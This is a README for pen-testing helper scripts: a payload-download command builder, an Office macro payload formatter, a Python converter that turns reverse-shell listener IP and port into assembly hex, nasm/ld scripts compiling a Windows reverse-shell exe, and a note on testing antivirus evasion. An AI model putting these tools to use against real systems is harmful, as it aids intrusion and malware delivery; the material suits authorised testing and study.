# Scripts to help the `Pen-Test` process
## Download file request builder

Simple bash script to quickly format different ways to download a file.

![linux_example](https://i.imgur.com/n7XZ33p.png)

```bash
./download_builder.sh -h
./download_builder.sh
./download_builder.sh -f sploit.exe -lh 10.10.14.51 -o linux
./download_builder.sh -f sploit.exe -lh tun0 -o win -f uwu.exe -lp 80 -s corp_share
```

## Office Macro Template Builder

Simple bash script to quickly format Macro payloads. To help fit the Winodws `255` character limit.

![macro_example](https://i.imgur.com/5aifc95.png)

```bash
./build_macro_template.sh
./build_macro_template.sh -h
./build_macro_template.sh -f revshell.p1
./build_macro_template.sh -p "<payload-string>" -o 2
```

---

## How to cross compile Assembly code with `nasm` and `ld` code from my YouTube Video

### Format the LHOST and LPORT into the proper hex for the Assembly payload.

```python3
#!/usr/bin/python3
import socket
import struct
import argparse

option = argparse.ArgumentParser(description="Convert LHOST and LPORT Into there Valid Hex format for Assembly")
option.add_argument("-i","--ip_address", required=False, help="IPV4 Address or LHOST of the Revshell Listener", type=str, default="10.10.14.4")
option.add_argument("-p","--port_number", required=False, help="Port Number or LPORT of the Revshell Listener", type=int, default=8443)

args = option.parse_args()

def ipv4_to_hex(ip_address):
    # Convert the IPv4 address to packed binary format
    packed_ip = socket.inet_aton(ip_address)
    # Convert the packed binary format to hexadecimal and reverse the order of bytes
    hex_ip = struct.unpack("!I", packed_ip)[0]
    reversed_ip = int.from_bytes(hex_ip.to_bytes(4, 'big'), 'little')
    return reversed_ip

def port_to_hex(port):
    # Convert port number to hexadecimal and reverse the order of bytes
    hex_port = struct.pack("!H", port)
    reversed_port = int.from_bytes(hex_port, 'little')
    return reversed_port

hex_ip = ipv4_to_hex(args.ip_address)
hex_port = port_to_hex(args.port_number)

print(f"IP Address: {args.ip_address} -> Hex-Flip: 0x{hex_ip:X}")
print(f"Port: {args.port_number} -> Port-Flip: 0x{hex_port:X}")
```

### Compile with `nasm` and `ld`

```bash
#!/bin/bash
# ./lin_to_win_compile_exe.sh filename.asm
file=$1
nasm -f win32 $file -o 1_obj.o &&  ld -m i386pe 1_obj.o -o z_rev.exe
```

```bash
#!/bin/bash
# ./rawbuild.sh filename.asm
file=$1
nasm -f win32 -o out.obj $file
objcopy -O binary out.obj just_raw.bin
```

* Get all the supported `nasm` formats with `nasm -h` help menu!

## Heap_Ratoon Script From My Youtube Video: 

```
How To Test/Verify Anti Virus Evasion Techniques Without Burning Them.
heap_ratoon_v2_fail.sh
```
